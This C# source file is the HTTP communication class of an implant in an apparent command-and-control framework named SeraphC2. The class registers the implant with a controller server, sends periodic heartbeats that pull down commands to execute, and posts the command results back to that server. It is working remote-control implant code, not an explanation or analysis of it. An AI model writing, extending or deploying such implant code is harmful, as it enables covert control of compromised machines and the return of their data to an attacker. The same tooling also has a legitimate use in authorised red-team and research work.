using System.Text;
using Newtonsoft.Json;
using SeraphC2.Implant.Models;
using SeraphC2.Implant.Core;

namespace SeraphC2.Implant.Communication;

public class HttpClientWrapper : IHttpClientWrapper
{
    private readonly HttpClient _httpClient;
    private readonly ImplantConfig _config;

    public HttpClientWrapper()
    {
        _httpClient = new HttpClient();
        _config = new ImplantConfig(); // This would normally be injected
        
        _httpClient.Timeout = _config.RequestTimeout;
        _httpClient.DefaultRequestHeaders.Add("User-Agent", _config.UserAgent);
    }

    public async Task<bool> RegisterImplantAsync(ImplantRegistration registration, CancellationToken cancellationToken = default)
    {
        try
        {
            var json = JsonConvert.SerializeObject(registration);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            
            var response = await _httpClient.PostAsync($"{_config.ServerUrl}/api/implants/register", content, cancellationToken);
            
            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Registration successful: {response.StatusCode}");
                return true;
            }
            else
            {
                Console.WriteLine($"Registration failed: {response.StatusCode} - {await response.Content.ReadAsStringAsync()}");
                return false;
            }
        }
        catch (HttpRequestException ex)
        {
            Console.WriteLine($"HTTP error during registration: {ex.Message}");
            return false;
        }
        catch (TaskCanceledException ex)
        {
            Console.WriteLine($"Registration timeout: {ex.Message}");
            return false;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Unexpected error during registration: {ex.Message}");
            return false;
        }
    }

    public async Task<IEnumerable<CommandMessage>?> SendHeartbeatAsync(HeartbeatMessage heartbeat, CancellationToken cancellationToken = default)
    {
        try
        {
            var json = JsonConvert.SerializeObject(heartbeat);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            
            var response = await _httpClient.PostAsync($"{_config.ServerUrl}/api/implants/heartbeat", content, cancellationToken);
            
            if (response.IsSuccessStatusCode)
            {
                var responseContent = await response.Content.ReadAsStringAsync();
                
                if (!string.IsNullOrEmpty(responseContent))
                {
                    var commands = JsonConvert.DeserializeObject<IEnumerable<CommandMessage>>(responseContent);
                    return commands ?? Enumerable.Empty<CommandMessage>();
                }
                
                return Enumerable.Empty<CommandMessage>();
            }
            else
            {
                Console.WriteLine($"Heartbeat failed: {response.StatusCode}");
                return null;
            }
        }
        catch (HttpRequestException ex)
        {
            Console.WriteLine($"HTTP error during heartbeat: {ex.Message}");
            return null;
        }
        catch (TaskCanceledException ex)
        {
            Console.WriteLine($"Heartbeat timeout: {ex.Message}");
            return null;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Unexpected error during heartbeat: {ex.Message}");
            return null;
        }
    }

    public async Task<bool> SendCommandResultAsync(CommandResult result, CancellationToken cancellationToken = default)
    {
        try
        {
            var json = JsonConvert.SerializeObject(result);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            
            var response = await _httpClient.PostAsync($"{_config.ServerUrl}/api/commands/result", content, cancellationToken);
            
            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Command result sent successfully: {result.CommandId}");
                return true;
            }
            else
            {
                Console.WriteLine($"Failed to send command result: {response.StatusCode}");
                return false;
            }
        }
        catch (HttpRequestException ex)
        {
            Console.WriteLine($"HTTP error sending command result: {ex.Message}");
            return false;
        }
        catch (TaskCanceledException ex)
        {
            Console.WriteLine($"Command result timeout: {ex.Message}");
            return false;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Unexpected error sending command result: {ex.Message}");
            return false;
        }
    }

    public void Dispose()
    {
        _httpClient?.Dispose();
    }
}